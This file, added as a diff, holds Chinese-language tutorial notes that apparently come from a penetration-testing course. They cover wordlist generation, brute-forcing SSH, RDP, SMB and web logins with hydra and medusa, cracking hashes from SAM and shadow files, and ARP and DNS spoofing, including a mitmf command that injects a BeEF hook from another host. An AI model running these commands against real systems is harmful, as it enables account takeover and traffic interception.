@@ -1,0 +1,243 @@
+1.身份认证方法:
+你知道什么(账号密码，pin，passphrase)
+你有什么(令牌，token，key，证书，密保，手机)
+你是谁(指纹，视网膜，虹膜，掌纹，声纹，面部识别)
+
+2.密码破解方法:
+人工猜解
+垃圾桶工程
+被动信息收集
+
+3.基于字典暴力破解:
+
+4.键盘空间字符爆破(效率极低)
+5.字典:
+/usr/share/wordlist
+/usr/share/wfuzz/wordlist
+/usr/share/seclists
+/usr/share/john/password.lst
+
+
+5.crunch
+crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100
+– -b 按大小分割字典文件（kb/kib、mb/mib、gb/gib）不加i的以1000为进位
+– -c 每个字典的行数
+ 以上两个参数必须与-o START 结合使用
+– -d 同一字符连贯出现数量（11 / aaa）
+ 字符集
+ crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt
+- -f 调用库文件
+ 无重复字符
+ crunch 1 1 -p 1234567890 | more
+- -p是改变顺序自动生成,并且1 1必须存在但是无效，如果以空格分割那么两个空格之间视为一个单位
+– -s -p与-s 参数不兼容（-s 指定起始字符串）
+ crunch 4 4 0123456789 -s 9990  从9990-9999
+ 读取文件中每行内容作为基本字符生成字典
+ crunch 1 1 -q read  
+- -q 读取文件，把每一行当作一个单位,同样1 1无效但必须写
+ 字典组成规则
+ crunch 6 6 -t @,%%^^ | more
+- t是按照规则生成
+ @：小写字母 lalpha(或者代表字符集中任意一个字符-f)
+ ,：大写字母 ualpha
+ %：数字 numeric
+ ^：符号 symbols
+ 输出文件压缩
+ crunch 4 4 -t @,%^ -o 1.txt -z 7z
+- -z 输出压缩
+ 其他压缩格式：gzip、bzip2、lzma
+ 7z压缩比率最大
+
+例子:
+ numeric-all-space -o w.txt -t @d@@ -s cdab
+ crunch 4 5 -p dog cat bird
+ crunch 5 5 abc DEF + \!@# -t ,@^%,
+– + 占位符(0-9)
+– \ 转义符（空格、符号）后面加上特殊符号
+ crunch 5 5 -t ddd%% -p dog cat bird
+– 任何不同于-p 参数指定的值都是占位符ddd为占位符
+ crunch 5 5 -d 2@ -t @@@%%
+
+  组合应用(不存储到电脑)
+– crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w - 
+– crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd -
+
+
+6.cupp(按个人信息生成密码字典)
+7.cewl(搜集网站信息生成字典)
+ cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt
+– -m：最小单词长度
+– -d：爬网深度
+– -e：收集包含email地址信息
+– -c：每个单词出现次数
+– 支持基本、摘要 身份认证
+– 支持代理
+
+8.john
+使用 John the Ripper 配置文件实现密码动态变型(生成的密码文件进行改造)
+ /etc/john/john.conf
+– [List.Rules:Wordlist] 
+– $[0-9]$[0-9]$[0-9] 
+– john --wordlist=cewl.txt --rules --stdout > m.txt
+
+– [List.Rules:test]
+$[0-9]$[0-9]$[0-9]$[a-zA-Z]
+$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[`~!@#$%^&*()\-_=+]
+– john --wordlist=cewl.txt --rules=test --stdout > m.txt
+– john --wordlist=ahm.lst --rules=test HASHFILE
+
+
+9.hydra
+Windows密码破解
+ hydra -l administrator -P pass.lst smb://1.1.1.1/admin$ -vVd
+ hydra -l administrator -P pass.lst rdp://1.1.1.1 -t 1 -vV
+- -t线程数
+ Linux密码破解
+ hydra -l root -P pass.lst ssh://1.1.1.1 -vV
+ 其他服务密码破解
+ hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64
+- -e多出三种空密码和账号相同的密码和账号反向的密码，更全面
+- -s服务端口
+ 图形化界面
+ xhydra
+
+
+ HTTP表单身份认证(没有burpsuite好)
+– hydra -l admin -P pass.lst 1.1.1.1 http-post-form
+"/dvwa/login.php:username=^USER^&password=^PASS^&Login=L
+in:S=index.php" -V – hydra -l admin -P pass.lst 1.1.1.1 http-post-form
+"/dvwa/login.php:username=^USER^&password=^PASS^&Login=L
+in:Login Failed" -V – /foo.php:user=^USER^&pass=^PASS^:S=success:C=/page/cookie:H
+=X-Foo: Foo
+ C：先访问指定页面取得cookie
+ H：指定http头 – https-post-form、http-get-form、https-get-form
+– -S：使用SSL连接
+
+
+10.pw-inspector
+筛选字典
+pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l (小写)
+pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u (大写)
+-m 3 -M 5 (最小三位最大5位)
+
+
+11.medusa
+比hydra稳定，但是模块少
+medusa -d  破解windows密码
+ medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F  破解Linux SSH密码
+ medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F  其他服务密码破解
+ medusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -F 
+ medusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:"dvwa/login.php" -m DENY-SIGNAL:"login.php" -m FORMDATA:"post?user=username&pass=password&Login=Login"
+
+ -n：非默认端口
+ -s：使用SSL连接
+ -T：并发主机数
+ medusa -M ftp -q
+
+
+离线猜测加密种类
+hashid
+hash-identifier
+
+windows系统通过kali1.10a启动并且进入live模式可以用kali控制windows电脑
+fdisk -e
+mount sda1 /mnt/
+cd /mnt/Windows/System32/config
+SAM(数据库存放密码)
+SYSTEM(开机启动填写密码的启动文件)
+
+samdump2 SYSTEM SAM > file
+如果aad3b435....:31d6cfe0d...证明没有密码
+并且:之后的就是密码的hash文
+
+
+12.Hashcat
+离线密码破解
+六种模式(-a 参数，减小字典大小)
+ 0 Straight：字典破解
+ 1 Combination：将字典中密码进行组合（1 2 > 11 22 12 21） 
+ 2 Toggle case：尝试字典中所有密码的大小写字母组合
+ 3 Brute force：指定字符集（或全部字符集）所有组合
+ 4 Permutation：字典中密码的全部字符置换组合（12 21） 
+ 5 Table-lookup：程序为字典中所有密码自动生成掩码
+
+ hashcat -b 
+ hashcat -m 100 hash.dump pass.lst
+ hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d
+ 结果：hashcat.pot
+ hashcat -m 100 -a 3 hash -i --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l
+ ?l = abcdefghijklmnopqrstuvwxyz
+ ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
+ ?d = 0123456789
+ ?s = !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+ ?a = ?l?u?d?s
+ ?b = 0x00 - 0xff
+
+13.oclhashcat(基于gpu,虚拟机无法使用,专业密码破解玩家)
+
+14.RainbowCrack(较优)
+可以上网下载彩虹表，直接破解(大部分是这样做因为有crunch)
+- rtgen：预计算，生成彩虹表，耗时的阶段(lm,ntlm,md5,sha1,sha256这几种)
+   在/usr/share/rainbowcrack/查看
+- rtsort：对rtgen生成的彩虹表进行排序
+- rcrack：查找彩虹表破解密码
+  以上命令必须顺序使用
+
+15.john
+ 模式
+ Wordlist：基于规则的字典破解
+ Single crack：默认被首先执行，使用Login/GECOS信息尝试破解
+ Incremental：所有或指定字符集的暴力破解
+ External：需要在主配配文件中用C语言子集编程
+
+unshadow /etc/passwd /etc/shadow > pass.txt
+john pass.txt 自动尝试前三种模式
+
+结果存放在~/.john/john.pot
+
+16.johnny
+图形化工具
+
+17.ophcrack
+专门为了windows密码破解
+需要下载彩虹表(太大了)
+
+_____________
+中间人获取密码
+
+18.arpspoof
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -t target -r gateway
+
+19.driftnet(图像)
+driftnet -i eth0
+driftnet -i eth0 -a -s -d filename
+
+20.webspy(不稳定,搜集url)
+webspy -i eth0 ip
+
+21.urlsnarf(url)
+urlsnarf -i eth0
+
+22.dsniff(专门截取密码)
+dsniff -i eth0 -m(协议自动解码)
+
+23.dnsspoof(域名欺骗)
+dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts
+127.0.0.1     *.taobao.com   (访问淘宝的时候跳转到127.0.0.1)
+
+24.dnschef
+dnschef --fakeip=解析的ip --fakedomains=www.google.com,www.youtube.com --interface 本机ip -q
+前提是目标的dns地址是自己的电脑
+
+
+25.mitmf
+mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js
+
+26.beef
+cd /usr/share/beef-xss/
+./beef
+生成hook.js给mitmf
+
+
+
